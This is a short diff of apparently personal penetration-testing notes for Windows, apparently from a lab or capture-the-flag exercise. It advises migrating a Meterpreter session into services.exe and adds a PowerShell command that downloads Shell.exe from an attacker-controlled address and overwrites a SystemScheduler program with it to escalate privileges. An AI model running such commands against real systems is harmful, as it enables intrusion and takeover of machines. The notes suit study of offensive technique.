@@ -59,6 +59,8 @@ windows:
 
       First use the ps command to view processes and find the PID of the services.exe process. Migrate to this process using the command migrate PID-OF-PROCESS
 
+    https://github.com/AonCyberLabs/Windows-Exploit-Suggester
 
+    powershell -c "Invoke-WebRequest -Uri 'http://10.18.55.1:8000/Shell.exe' -OutFile 'C:\Program Files (x86)\SystemScheduler\Message.exe'"
 
 
